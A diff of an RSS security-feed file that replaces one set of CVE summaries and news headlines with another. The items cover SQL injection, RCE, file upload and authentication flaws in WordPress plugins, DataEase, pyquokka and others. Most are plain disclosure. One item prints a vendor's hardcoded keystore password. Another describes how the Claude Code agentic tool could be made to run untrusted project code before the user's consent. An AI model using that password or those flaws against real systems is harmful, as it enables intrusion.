@@ -1,428 +1,785 @@
-<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Exploits &amp; Vulns</title><link>https://news.securehub.cc</link><description></description><item><title>CVE-2025-0616 - SQLi in Teknolojik Center Telecommunication&apos;s B2B - Netsis Panel</title><link>https://cvefeed.io/vuln/detail/CVE-2025-0616</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 08:05:08 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-0616
- Oct. 3, 2025, 8:05 a.m. | 10 minutes ago
-Authorization Bypass Through User-Controlled Key vulnerability in Teknolojik Center Telecommunication Industry Trade Co. Ltd. B2B - Netsis Panel allows SQL Injection.This issue affects B2B - Netsis Panel: through 20251003.
- 8.2 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-11223 - Panasonic AutoDownloader DLL Loading Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11223</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 08:02:18 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11223
- Oct. 3, 2025, 8:02 a.m. | 13 minutes ago
-Installer of 
-
-Panasonic 
-
-AutoDownloader 
-
-
-
- version 1.2.8
-contains an issue with the DLL search path, which may lead to loading 
-
-a crafted DLL file in the same directory.
- 8.4 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59536 - Claude Code&apos;s startup trust dialog could lead to Command Execution attack</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59536</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 07:15:44 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59536
- Oct. 3, 2025, 7:15 a.m. | 59 minutes ago
-Claude Code is an agentic coding tool. Versions before 1.0.111 were vulnerable to Code Injection due to a bug in the startup trust dialog implementation. Claude Code could be tricked to execute code contained in a project before the user accepted the startup trust dialog. Exploiting this requires a user to start Claude Code in an untrusted directory. Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version. This issue is fixed in version 1.0.111.
- 8.7 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>Your Easiest Fix: The 3 Golden Rules for a Password that AI Can’t Crack</title><link>https://thecyberexpress.com/cybersecurity-awareness-month-2025/</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 06:27:14 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            October is here, and Cybersecurity Awareness Month 2025 is about to come into being. Department of Homeland Security (DHS) and CISA have initiated this year’s campaign with the theme of ‘Building our  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Red Hat Confirms Data Breach After Hackers Claim to Steal 570GB of Private GitHub Repositories</title><link>https://cybersecuritynews.com/red-hat-confirms-data-breach/</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 05:25:58 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Red Hat, the world’s leading enterprise open-source software provider, has officially confirmed a significant security incident involving unauthorized access to its internal GitLab instance used by th ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Google Announces $4 Billion Arkansas Investment for New AI Data Center and 600 MW Solar Project</title><link>https://securityonline.info/google-announces-4-billion-arkansas-investment-for-new-ai-data-center-and-600-mw-solar-project/</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 04:06:04 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Google has announced plans to invest up to $4 billion in Arkansas by 2027, channeling resources into infrastructure, energy transition, and workforce development. At the heart of this initiative lies  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Actively Exploited: Critical Flaw CVE-2025-6388 (CVSS 9.8) Allows Authentication Bypass in WordPress Plugin</title><link>https://securityonline.info/actively-exploited-critical-flaw-cve-2025-6388-cvss-9-8-allows-authentication-bypass-in-wordpress-plugin/</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 03:24:41 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            A newly disclosed vulnerability in the Spirit Framework plugin for WordPress has put thousands of websites at immediate risk of compromise. Tracked as CVE-2025-6388, the flaw carries a CVSS score of 9 ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Yoast SEO Premium Flaw: Stored XSS Bug (CVE-2025-11241) Exposes Millions of WordPress Sites</title><link>https://securityonline.info/yoast-seo-premium-flaw-stored-xss-bug-cve-2025-11241-exposes-millions-of-wordpress-sites/</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 03:13:05 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            A new vulnerability has been disclosed in the widely used Yoast SEO Premium plugin for WordPress, potentially exposing millions of websites to cross-site scripting (XSS) attacks. Tracked as CVE-2025-1 ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>GreyNoise Detects Coordinated Surge Exploiting Grafana Path Traversal Flaw (CVE-2021-43798)</title><link>https://securityonline.info/greynoise-detects-coordinated-surge-exploiting-grafana-path-traversal-flaw-cve-2021-43798/</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 02:13:40 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Recently, GreyNoise observed a sudden and highly coordinated wave of exploitation attempts targeting CVE-2021-43798, a Grafana path traversal vulnerability that allows arbitrary file reads. The surge, ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Confucius APT Evolves: Espionage Group Shifts from WooperStealer to Advanced Python Backdoor AnonDoor</title><link>https://securityonline.info/confucius-apt-evolves-espionage-group-shifts-from-wooperstealer-to-advanced-python-backdoor-anondoor/</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 01:48:46 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            The Confucius group, a long-running cyber-espionage actor first identified in 2013, has resurfaced with a new wave of operations across South Asia. In its latest analysis, FortiGuard Labs highlights h ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Researcher Details Zero-Day Linux/Android Kernel Flaw (CVE-2025-38352)</title><link>https://securityonline.info/researcher-details-zero-day-linux-android-kernel-flaw-cve-2025-38352/</link><author></author><category>vulns</category><pubDate>Fri, 3 Oct 2025 00:01:49 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[Researcher Details Zero-Day Linux/Android Kernel Flaw (CVE-2025-38352)]]></content:encoded></item><item><title>Re: [FD] : &quot;Glass Cage&quot; – Zero-Click iMessage → Persistent iOS Compromise + Bricking (CVE-2025-24085 / 24201, CNVD-2025-07885)</title><link>https://seclists.org/fulldisclosure/2025/Oct/1</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 22:20:17 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[Re: [FD]	: "Glass Cage" – Zero-Click iMessage → Persistent iOS Compromise + Bricking (CVE-2025-24085 / 24201, CNVD-2025-07885)
-            Full Disclosure
-mailing list archives
-From: josephgoyd via Fulldisclosure Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Re: [FD] Full Disclosure: CVE-2025-31200 &amp; CVE-2025-31201 – 0-Click iMessage Chain → Secure Enclave Key Theft, Wormable RCE, Crypto Theft</title><link>https://seclists.org/fulldisclosure/2025/Oct/0</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 22:20:14 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Full Disclosure
-mailing list archives
-Re: [FD]	Full Disclosure: CVE-2025-31200 & CVE-2025-31201 – 0-Click iMessage Chain → Secure Enclave Key Theft, Wormable RCE, Crypto Theft
-From: josephgoyd via Ful ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CVE-2025-61666 - Traccar Unauthenticated Local File Inclusion on Windows - Leakage of Traccar Config File</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61666</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 22:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61666
- Oct. 2, 2025, 10:15 p.m. | 9 hours, 59 minutes ago
-Traccar is an open source GPS tracking system. Default installs of Traccar on Windows between versions 6.1-  6.8.1 and non default installs between versions 5.8 - 6.0 are vulnerable to unauthenticated local file inclusion attacks which can lead to leakage of passwords or any file on the file system including the Traccar configuration file. Versions 5.8 - 6.0 are only vulnerable if  is set in the configuration file. Versions 6.1 - 6.8.1 are vulnerable by default as the web override is enabled by default. The vulnerable code is removed in version 6.9.0.
- 8.7 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-61668 - @plone/volto vulnerable to potential DoS by invoking specific URL by anonymous user</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61668</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 22:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61668
- Oct. 2, 2025, 10:15 p.m. | 9 hours, 59 minutes ago
-Volto is a ReactJS-based frontend for the Plone Content Management System. Versions 16.34.0 and below, 17.0.0 through 17.22.1, 18.0.0 through 18.27.1, and 19.0.0-alpha.1 through 19.0.0-alpha.5, an anonymous user could cause the NodeJS server part of Volto to quit with an error when visiting a specific URL. This issue is fixed in versions 16.34.1, 17.22.2, 18.27.2 and 19.0.0-alpha.6.
- 8.7 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-61605 - WeGIA: SQL Injection (Blind Time-Based) Vulnerability in /pet/profile_pet.php Endpoint</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61605</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 21:16:01 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61605
- Oct. 2, 2025, 9:16 p.m. | 10 hours, 59 minutes ago
-WeGIA is an open source web manager with a focus on charitable institutions. Versions 3.4.12 and below contain an SQL Injection vulnerability which was identified in the /pet/profile_pet.php endpoint, specifically in the id_pet parameter. This vulnerability allows attackers to execute arbitrary SQL commands, compromising the confidentiality, integrity, and availability of the database. This issue is fixed in version 3.5.0.
- 9.4 | CRITICAL
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-61665 - WeGIA: Broken Access Control in `get_relatorios_socios.php` Endpoint</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61665</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 21:16:01 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61665
- Oct. 2, 2025, 9:16 p.m. | 10 hours, 59 minutes ago
-WeGIA is an open source web manager with a focus on charitable institutions. Versions 3.4.12 and below contain a Broken Access Control vulnerability, identified in the get_relatorios_socios.php endpoint. This vulnerability allows unauthenticated attackers to directly access sensitive personal and financial information of members without requiring authentication or authorization. This issue is fixed in version 3.5.0.
- 8.7 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-61595 - MANTRA tx gas limit is not enforced in send hooks</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61595</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 20:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61595
- Oct. 2, 2025, 8:15 p.m. | 11 hours, 59 minutes ago
-MANTRA is a purpose-built RWA Layer 1 Blockchain, capable of adherence to real world regulatory requirements. Versions 4.0.1 and below do not enforce the tx gas limit in its send hooks. Send hooks can spend more gas than what remains in tx, combined with recursive calls in the wasm contract, potentially amplifying the gas consumption exponentially. This is fixed in version 4.0.2.
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Exploits &amp; Vulns</title><link>https://news.securehub.cc</link><description></description><item><title>CVE-2025-9890 - Theme Editor &lt;= 3.0 - Cross-Site Request Forgery to Remote Code Execution</title><link>https://cvefeed.io/vuln/detail/CVE-2025-9890</link><author></author><category>vulns</category><pubDate>Sat, 18 Oct 2025 09:15:34 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-9890
+ Oct. 18, 2025, 9:15 a.m. | 1 hour, 23 minutes ago
+The Theme Editor plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 3.0. This is due to missing or incorrect nonce validation on the 'theme_editor_theme' page. This makes it possible for unauthenticated attackers to achieve remote code execution via a forged request granted they can trick a site administrator into performing an action such as clicking on a link.
  8.8 | HIGH
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-61603 - WeGIA: SQL Injection (Blind Time-Based) Vulnerability in API `descricao` Parameter</title><link>https://cvefeed.io/vuln/detail/CVE-2025-61603</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 20:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-61603
- Oct. 2, 2025, 8:15 p.m. | 11 hours, 59 minutes ago
-WeGIA is a Web manager for charitable institutions. Versions 3.4.12 and below include an SQL Injection vulnerability which was identified in the /controle/control.php endpoint, specifically in the descricao parameter. This vulnerability allows attackers to execute arbitrary SQL commands, compromising the confidentiality, integrity, and availability of the database. This issue is fixed in version 3.5.0.
- 9.4 | CRITICAL
+]]></content:encoded></item><item><title>CVE-2025-5555 - Nixdorf Wincor PORT IO Driver IOCTL wnport.sys sub_11100 stack-based overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-5555</link><author></author><category>vulns</category><pubDate>Sat, 18 Oct 2025 08:15:34 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-5555
+ Oct. 18, 2025, 8:15 a.m. | 2 hours, 23 minutes ago
+A vulnerability has been found in Nixdorf Wincor PORT IO Driver up to 1.0.0.1. This affects the function sub_11100 in the library wnport.sys of the component IOCTL Handler. Such manipulation leads to stack-based buffer overflow. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. Upgrading to version 3.0.0.1 is able to mitigate this issue. Upgrading the affected component is recommended. The vendor was contacted beforehand and was able to provide a patch very early.
+ 8.5 | HIGH
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-10653 - Raise3D Pro2 Series 3D Printers Authentication Bypass Using an Alternate Path or Channel</title><link>https://cvefeed.io/vuln/detail/CVE-2025-10653</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 20:15:31 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-10653
- Oct. 2, 2025, 8:15 p.m. | 11 hours, 59 minutes ago
-An unauthenticated debug port may allow access to the device file system.
- 8.6 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59835 - LangBot has a cross-directory file upload vulnerability, which could lead to system takeover</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59835</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 19:15:31 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59835
- Oct. 2, 2025, 7:15 p.m. | 12 hours, 59 minutes ago
-LangBot is a global IM bot platform designed for LLMs. In versions 4.1.0 up to but not including 4.3.5, authorized attackers can exploit the /api/v1/files/documents interface to perform arbitrary file uploads. Since this interface does not strictly restrict the storage directory of files on the server, it is possible to upload dangerous files to specific system directories. This is fixed in version 4.3.5.
- 8.6 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>Hackers Claim Breach of Red Hat Customer Data</title><link>https://thecyberexpress.com/red-hat-customer-data-breach/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 17:45:16 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Hackers claim to have breached a Red Hat GitHub instance and stolen sensitive customer data.
-The claims were made in Telegram posts by a group calling itself “Crimson Collective,” which said it exfilt ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>DrayTek warns of remote code execution bug in Vigor routers</title><link>https://www.bleepingcomputer.com/news/security/draytek-warns-of-remote-code-execution-bug-in-vigor-routers/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 17:37:46 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Networking hardware maker DrayTek released an advisory to warn about a security vulnerability in several Vigor router models that could allow remote, unauthenticated actors to execute perform arbitrar ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CVE-2025-59407 - Flock Safety Java Keystore Hardcoded Password Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59407</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 17:16:07 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59407
- Oct. 2, 2025, 5:16 p.m. | 14 hours, 59 minutes ago
-The Flock Safety DetectionProcessing com.flocksafety.android.objects application 6.35.33 for Android (installed on Falcon and Sparrow License Plate Readers and Bravo Edge AI Compute Devices) bundles a Java Keystore (flock_rye.bks) along with its hardcoded password (flockhibiki17) in its code. The keystore contains a private key.
+]]></content:encoded></item><item><title>CVE-2025-11391 - PPOM – Product Addons &amp; Custom Fields for WooCommerce &lt;= 33.0.15 - Unauthenticated Arbitrary File Upload</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11391</link><author></author><category>vulns</category><pubDate>Sat, 18 Oct 2025 07:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11391
+ Oct. 18, 2025, 7:15 a.m. | 3 hours, 23 minutes ago
+The PPOM – Product Addons & Custom Fields for WooCommerce plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the image cropper functionality in all versions up to, and including, 33.0.15. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible. While the vulnerable code is in the free version, this only affected users with the paid version of the software installed and activated.
  9.8 | CRITICAL
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-34208 - Vasion Print (formerly PrinterLogic) Insecure Password Hashing</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34208</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 17:16:05 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34208
- Oct. 2, 2025, 5:16 p.m. | 14 hours, 59 minutes ago
-Vasion Print (formerly PrinterLogic) Virtual Appliance Host and Application (VA/SaaS deployments) store user passwords using unsalted SHA-512 hashes with a fall-back to unsalted SHA-1. The hashing is performed via PHP's `hash()` function in multiple files (server_write_requests_users.php, update_database.php, legacy/Login.php, tests/Unit/Api/IdpControllerTest.php). No per-user salt is used and the fast hash algorithms are unsuitable for password storage. An attacker who obtains the password database can recover cleartext passwords via offline dictionary or rainbow table attacks. The vulnerable code also contains logic that migrates legacy SHA-1 hashes to SHA-512 on login, further exposing users still on the old hash. This vulnerability was partially resolved, but still present within the legacy authentication platform.
+]]></content:encoded></item><item><title>CVE-2017-20208 - RegistrationMagic - Custom Registration Forms &lt;= 3.7.9.2 - PHP Object Injection</title><link>https://cvefeed.io/vuln/detail/CVE-2017-20208</link><author></author><category>vulns</category><pubDate>Sat, 18 Oct 2025 04:15:59 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2017-20208
+ Oct. 18, 2025, 4:15 a.m. | 6 hours, 23 minutes ago
+The RegistrationMagic – Custom Registration Forms, User Registration, Payment, and User Login plugin for WordPress is vulnerable to PHP Object Injection in all versions up to 3.7.9.3 (exclusive) via deserialization of untrusted input from the is_expired_by_date() function. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to fetch a remote file and install it on the site.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2017-20207 - Flickr Gallery &lt;= 1.5.2 - Unauthenticated PHP Object Injection</title><link>https://cvefeed.io/vuln/detail/CVE-2017-20207</link><author></author><category>vulns</category><pubDate>Sat, 18 Oct 2025 04:15:58 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2017-20207
+ Oct. 18, 2025, 4:15 a.m. | 6 hours, 23 minutes ago
+The Flickr Gallery plugin for WordPress is vulnerable to PHP Object Injection in versions up to, and including, 1.5.2 via deserialization of untrusted input from the `pager ` parameter. This allows unauthenticated attackers to inject a PHP Object. Attackers were actively exploiting this vulnerability with the WP_Theme() class to create backdoors.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2017-20206 - Appointments &lt;= 2.2.1 - Unauthenticated PHP Object Injection</title><link>https://cvefeed.io/vuln/detail/CVE-2017-20206</link><author></author><category>vulns</category><pubDate>Sat, 18 Oct 2025 04:15:43 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2017-20206
+ Oct. 18, 2025, 4:15 a.m. | 6 hours, 23 minutes ago
+The Appointments plugin for WordPress is vulnerable to PHP Object Injection in versions up to, and including, 2.2.1 via deserialization of untrusted input from the `wpmudev_appointments` cookie. This allows unauthenticated attackers to inject a PHP Object. Attackers were actively exploiting this vulnerability with the WP_Theme() class to create backdoors.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62650 - RBI Restaurant Brands International Client-Side Authentication Bypass</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62650</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 21:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62650
+ Oct. 17, 2025, 9:15 p.m. | 13 hours, 23 minutes ago
+The Restaurant Brands International (RBI) assistant platform through 2025-09-06 relies on client-side authentication for use of the diagnostic screen.
+ 8.3 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62645 - RBI Assistant Platform Privilege Escalation Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62645</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 21:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62645
+ Oct. 17, 2025, 9:15 p.m. | 13 hours, 23 minutes ago
+The Restaurant Brands International (RBI) assistant platform through 2025-09-06 allows a remote authenticated attacker to obtain a token with administrative privileges for the entire platform via the createToken GraphQL mutation.
+ 9.9 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62515 - Remote Code Execution by Pickle Deserialization via FlightServer in pyquokka</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62515</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 21:15:36 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62515
+ Oct. 17, 2025, 9:15 p.m. | 13 hours, 23 minutes ago
+pyquokka is a framework for making data lakes work for time series. In versions 0.3.1 and prior, the FlightServer class directly uses pickle.loads() to deserialize action bodies received from Flight clients without any sanitization or validation in the do_action() method. The vulnerable code is located in pyquokka/flight.py at line 283 where arbitrary data from Flight clients is directly passed to pickle.loads(). When FlightServer is configured to listen on 0.0.0.0, this allows attackers across the entire network to perform arbitrary remote code execution by sending malicious pickled payloads through the set_configs action. Additional vulnerability points exist in the cache_garbage_collect, do_put, and do_get functions where pickle.loads is used to deserialize untrusted remote data.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-11925 - Incorrect Content-Type Header</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11925</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 20:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11925
+ Oct. 17, 2025, 8:15 p.m. | 14 hours, 23 minutes ago
+Incorrect Content-Type header in one of the APIs (`text/html` instead of `application/json`) replies may potentially allow injection of HTML/JavaScript into reply.This issue affects BLU-IC2: through 1.19.5; BLU-IC4: through 1.19.5.
+ 10.0 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-56221 - SigningHub Authentication Bypass</title><link>https://cvefeed.io/vuln/detail/CVE-2025-56221</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 19:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-56221
+ Oct. 17, 2025, 7:15 p.m. | 15 hours, 23 minutes ago
+A lack of rate limiting in the login mechanism of SigningHub v8.6.8 allows attackers to bypass authentication via a brute force attack.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62419 - DataEase vulnerable to JDBC URL injection in DB2 and MongoDB data source configuration</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62419</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 18:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62419
+ Oct. 17, 2025, 6:15 p.m. | 16 hours, 23 minutes ago
+DataEase is a data visualization and analytics platform. In DataEase versions through 2.10.13, a JDBC URL injection vulnerability exists in the DB2 and MongoDB data source configuration handlers. In the DB2 data source handler, when the extraParams field is empty, the HOSTNAME, PORT, and DATABASE values are directly concatenated into the JDBC URL without filtering illegal parameters. This allows an attacker to inject a malicious JDBC string into the HOSTNAME field to bypass previously patched vulnerabilities CVE-2025-57773 and CVE-2025-58045. The vulnerability is fixed in version 2.10.14. No known workarounds exist.
  8.2 | HIGH
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-34210 - Vasion Print (formerly PrinterLogic) Readable Cleartext Passwords</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34210</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 17:16:05 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34210
- Oct. 2, 2025, 5:16 p.m. | 14 hours, 59 minutes ago
-Vasion Print (formerly PrinterLogic) Virtual Appliance Host and Application (VA/SaaS deployments) store a large number of sensitive credentials (database passwords, MySQL root password, SaaS keys, Portainer admin password, etc.) in cleartext files that are world-readable. Any local user - or any process that can read the host filesystem - can retrieve all of these secrets in plain text, leading to credential theft and full compromise of the appliance. The vendor does not consider this to be a security vulnerability as this product "follows a shared responsibility model, where administrators are expected to configure persistent storage encryption."
+]]></content:encoded></item><item><title>CVE-2025-62420 - DataEase vulnerable to remote code execution via H2 JDBC driver bypass</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62420</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 18:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62420
+ Oct. 17, 2025, 6:15 p.m. | 16 hours, 23 minutes ago
+DataEase is a data visualization and analytics platform. In DataEase versions through 2.10.13, a JDBC driver bypass vulnerability exists in the H2 database connection handler. The getJdbc function in H2.java checks if the jdbcUrl starts with jdbc:h2 but returns a separate jdbc field as the actual connection URL. An attacker can provide a jdbcUrl that starts with jdbc:h2 while supplying a different jdbc field with an arbitrary JDBC driver and connection string. This allows an authenticated attacker to trigger arbitrary JDBC connections with malicious drivers, potentially leading to remote code execution. The vulnerability is fixed in version 2.10.14. No known workarounds exist.
+ 8.2 | HIGH
+
